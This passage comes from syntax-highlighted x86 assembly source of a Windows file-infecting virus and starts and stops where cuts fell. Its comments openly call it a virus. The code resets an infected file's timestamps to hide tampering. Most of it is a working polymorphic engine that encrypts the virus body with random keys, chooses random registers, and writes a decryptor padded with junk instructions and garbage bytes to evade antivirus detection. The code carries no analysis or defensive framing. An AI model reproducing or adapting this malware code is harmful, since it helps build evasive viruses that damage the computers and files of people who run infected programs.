             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">       </span><span class="sc1">; CreationTime</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">FileDate</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">DosDateTimeToFileTime</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">      </span><span class="sc1">; LastWriteTime</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">                            </span><span class="sc1">; LastAcessTime</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">                            </span><span class="sc1">; CreationTime</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">SetFileTime</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lclose</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; polymorphic routine structure :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            mov          Reg32_A,(IDATSize + GarbageSize) / 4</span><span class="sc0">
</span><span class="sc1">;            mov          Reg32_B,offset VS           (virus address)</span><span class="sc0">
</span><span class="sc1">;            mov          Reg32_C,Key1                (decryption key)</span><span class="sc0">
</span><span class="sc1">; loop: </span><span class="sc0">
</span><span class="sc1">;            xor          [Reg32_B],Reg32_C</span><span class="sc0">
</span><span class="sc1">;            add          Reg32_B,4</span><span class="sc0">
</span><span class="sc1">;            add          Reg32_C,Key2                (fixed key)</span><span class="sc0">
</span><span class="sc1">;            dec          Reg32_A  </span><span class="sc0">
</span><span class="sc1">;            jz           VS</span><span class="sc0">
</span><span class="sc1">;            jmp          loop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">GetPolyRoutine</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">VirusOffset</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">MapBase</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">VStart</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; put the encrypted copy of the virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Key1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Key2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Key1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IDATSize</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
             </span><span class="sc6">shr</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">EncryptCode</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">lodsd</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Key2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">EncryptCode</span><span class="sc0">


             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">GarbageSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">AddGarbage</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">AddGarbage</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; create the ploymorphic routine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">                                  </span><span class="sc1">; pushad</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                     </span><span class="sc1">; don't touch esp !</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandCode</span><span class="sc0">               

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandReg</span><span class="sc0">                </span><span class="sc1">; mov Reg32_A,IDATSize / 4</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Reg32_A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
             </span><span class="sc6">shr</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1C</span><span class="sc0">                    </span><span class="sc1">; - 10h max</span><span class="sc0">
             </span><span class="sc6">neg</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IDATSize</span><span class="sc0">              </span><span class="sc1">; + initilized code</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">GarbageSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; + garbage</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
             </span><span class="sc6">shr</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">                                  </span><span class="sc1">; = size to decrypt</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandCode</span><span class="sc0">               

</span><span class="sc5">GetRegB</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandReg</span><span class="sc0">                </span><span class="sc1">; mov Reg32_B,offset VS</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">                     </span><span class="sc1">; don't use ebp</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetRegB</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Reg32_B</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">VirusAddress</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandCode</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandReg</span><span class="sc0">                </span><span class="sc1">; mov Reg32_C,Key1</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Reg32_C</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Key1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">LoopStart</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandCode</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">                     </span><span class="sc1">; xor [Reg32_B],Reg32_C</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Reg32_C</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">sal</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Reg32_B</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandCode</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83</span><span class="sc0">                     </span><span class="sc1">; add Reg32_B,4</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Reg32_B</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandCode</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81</span><span class="sc0">                     </span><span class="sc1">; add Reg32_C,Key2</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Reg32_C</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Key2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandCode</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Reg32_A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; dec Reg32_A</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">840F</span><span class="sc0">                   </span><span class="sc1">; jz VS</span><span class="sc0">
             </span><span class="sc6">stosw</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">VStart</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">neg</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandCode</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">                   </span><span class="sc1">; jmp Loop</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">LoopStart</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">neg</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; add again some garbage</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
             </span><span class="sc6">shr</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc0">                    </span><span class="sc1">; + 120h max</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">AddGarbage2</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">AddGarbage2</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; fill the uninitialized data with blanks</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">RawVSize</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">VStart</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetRandReg</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">sal</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetRandReg</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetRandCode</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">InstrLoop</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandInstr</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">InstrLoop</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetRandInstr</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">

             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IncR32</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">DecR32</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">MovR8I8</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">MovR32I32</span><span class="sc0">

</span><span class="sc5">IncR32</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandReg</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DecR32</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandReg</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MovR8I8</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandReg</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">MovR8I8</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">shl</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MovR32I32</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandReg</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetRandNb</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RandNb</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mul</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RMul</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
